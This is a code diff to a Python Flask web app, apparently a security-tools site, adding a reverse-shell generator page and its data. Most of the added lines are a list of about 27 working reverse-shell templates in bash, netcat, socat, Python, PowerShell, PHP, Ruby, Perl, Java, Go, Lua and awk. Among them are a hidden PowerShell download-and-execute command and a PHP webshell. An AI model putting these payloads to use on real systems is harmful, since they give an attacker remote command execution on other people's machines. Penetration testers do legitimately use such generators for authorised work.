@@ -108,6 +108,72 @@ WORKFLOWS = [
     },
 ]
 
+# ── Reverse shell definitions ──────────────────────────────────────────────────
+# Templates use {IP} and {PORT} as placeholders — replaced client-side in JS.
+REVSHELLS = [
+    # ── Bash ──────────────────────────────────────────────────────────────────
+    {"id":"bash-tcp","name":"Bash TCP","os":"linux","os_icon":"🐧","tag":"bash",
+     "template":"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"},
+    {"id":"bash-196","name":"Bash 196","os":"linux","os_icon":"🐧","tag":"bash",
+     "template":"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196"},
+    {"id":"bash-readline","name":"Bash readline","os":"linux","os_icon":"🐧","tag":"bash",
+     "template":"exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done"},
+    {"id":"bash-udp","name":"Bash UDP","os":"linux","os_icon":"🐧","tag":"bash",
+     "template":"sh -i >& /dev/udp/{IP}/{PORT} 0>&1"},
+    # ── nc / socat ─────────────────────────────────────────────────────────────
+    {"id":"nc-e","name":"nc -e /bin/bash","os":"linux","os_icon":"🐧","tag":"nc",
+     "template":"nc {IP} {PORT} -e /bin/bash"},
+    {"id":"nc-mkfifo","name":"nc mkfifo (no -e)","os":"linux","os_icon":"🐧","tag":"nc",
+     "template":"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f"},
+    {"id":"nc-ncat","name":"ncat","os":"any","os_icon":"✦","tag":"nc",
+     "template":"ncat {IP} {PORT} -e /bin/bash"},
+    {"id":"nc-windows","name":"nc Windows","os":"windows","os_icon":"🪟","tag":"nc",
+     "template":"nc.exe {IP} {PORT} -e cmd.exe"},
+    {"id":"socat","name":"socat","os":"linux","os_icon":"🐧","tag":"nc",
+     "template":"socat TCP:{IP}:{PORT} EXEC:/bin/bash"},
+    {"id":"socat-pty","name":"socat PTY (full TTY)","os":"linux","os_icon":"🐧","tag":"nc",
+     "template":"socat TCP:{IP}:{PORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane"},
+    # ── Python ────────────────────────────────────────────────────────────────
+    {"id":"python3","name":"Python 3","os":"any","os_icon":"✦","tag":"python",
+     "template":"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"},
+    {"id":"python2","name":"Python 2","os":"any","os_icon":"✦","tag":"python",
+     "template":"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"},
+    {"id":"python3-win","name":"Python 3 Windows","os":"windows","os_icon":"🪟","tag":"python",
+     "template":"python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"{IP}\",{PORT}));[subprocess.call([\"cmd.exe\"],stdin=s,stdout=s,stderr=s)]'"},
+    # ── PowerShell ────────────────────────────────────────────────────────────
+    {"id":"powershell-1","name":"PowerShell #1","os":"windows","os_icon":"🪟","tag":"ps",
+     "template":"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sb = (iex $data 2>&1 | Out-String);$sb2 = $sb+'PS '+(pwd).Path+'> ';$sb3 = ([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sb3,0,$sb3.Length);$stream.Flush()};$client.Close()\""},
+    {"id":"powershell-iex","name":"PowerShell IEX download","os":"windows","os_icon":"🪟","tag":"ps",
+     "template":"powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{IP}:{PORT}/shell.ps1')\""},
+    {"id":"powershell-revps","name":"PowerShell reverse (ConPtyShell)","os":"windows","os_icon":"🪟","tag":"ps",
+     "template":"IEX(IWR http://{IP}:{PORT}/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell {IP} {PORT}"},
+    # ── PHP ───────────────────────────────────────────────────────────────────
+    {"id":"php-exec","name":"PHP exec","os":"web","os_icon":"🌐","tag":"php",
+     "template":"php -r '$sock=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"},
+    {"id":"php-popen","name":"PHP popen","os":"web","os_icon":"🌐","tag":"php",
+     "template":"php -r '$sock=fsockopen(\"{IP}\",{PORT});popen(\"/bin/sh -i <&3 >&3 2>&3\",\"r\");'"},
+    {"id":"php-shell_exec","name":"PHP shell_exec (file)","os":"web","os_icon":"🌐","tag":"php",
+     "template":"<?php exec(\"/bin/bash -c 'bash -i >/dev/tcp/{IP}/{PORT} 0>&1'\"); ?>"},
+    {"id":"php-system","name":"PHP webshell","os":"web","os_icon":"🌐","tag":"php",
+     "template":"<?php system($_GET['cmd']); ?>"},
+    # ── Ruby / Perl / Java / Go / Lua / awk ──────────────────────────────────
+    {"id":"ruby","name":"Ruby","os":"any","os_icon":"✦","tag":"ruby",
+     "template":"ruby -rsocket -e'f=TCPSocket.open(\"{IP}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"},
+    {"id":"perl","name":"Perl","os":"any","os_icon":"✦","tag":"perl",
+     "template":"perl -e 'use Socket;$i=\"{IP}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"},
+    {"id":"perl-win","name":"Perl Windows","os":"windows","os_icon":"🪟","tag":"perl",
+     "template":"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{IP}:{PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"},
+    {"id":"java","name":"Java","os":"any","os_icon":"✦","tag":"java",
+     "template":"Runtime r=Runtime.getRuntime();String[] cmd={\"bash\",\"-c\",\"exec 5<>/dev/tcp/{IP}/{PORT};cat<&5|while read l;do $l 2>&5>&5;done\"};Process p=r.exec(cmd);p.waitFor();"},
+    {"id":"go","name":"Go","os":"any","os_icon":"✦","tag":"go",
+     "template":'package main\nimport("net";"os/exec")\nfunc main(){\n  c,_:=net.Dial("tcp","{IP}:{PORT}")\n  cmd:=exec.Command("/bin/sh")\n  cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c\n  cmd.Run()\n}'},
+    {"id":"lua","name":"Lua","os":"linux","os_icon":"🐧","tag":"lua",
+     "template":"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{IP}',{PORT});os.execute('/bin/sh -i <&3 >&3 2>&3');\""},
+    {"id":"awk","name":"awk","os":"linux","os_icon":"🐧","tag":"awk",
+     "template":"awk 'BEGIN{s=\"/inet/tcp/0/{IP}/{PORT}\";while(42){do{printf\"$ \"|&s;s|&getline c;if(c){while((c|&getline)>0)print$0|&s;close(c)}}while(c!=\"exit\")close(s)}}' /dev/stdin"},
+]
+
+
 _ALLOWED_EXT = {
     ".zip", ".jar", ".apk", ".war", ".ear",
     ".tar", ".tgz", ".tbz2", ".txz",
@@ -297,6 +363,21 @@ def workflows():
     from zip_analyzer.tool_data import TOOLS_BY_SLUG
     return render_template("workflows.html", workflows=WORKFLOWS,
                            tools_by_slug=TOOLS_BY_SLUG, active_page="workflows")
+
+
+@app.route("/generators/revshells")
+def revshells():
+    return render_template("revshells.html", shells=REVSHELLS, active_page="revshells")
+
+
+@app.route("/tools/encode")
+def encode_tool():
+    return render_template("encode.html", active_page="encode")
+
+
+@app.route("/tools/hashid")
+def hashid_tool():
+    return render_template("hashid.html", active_page="hashid")
 
 
 @app.route("/generators/<slug>")
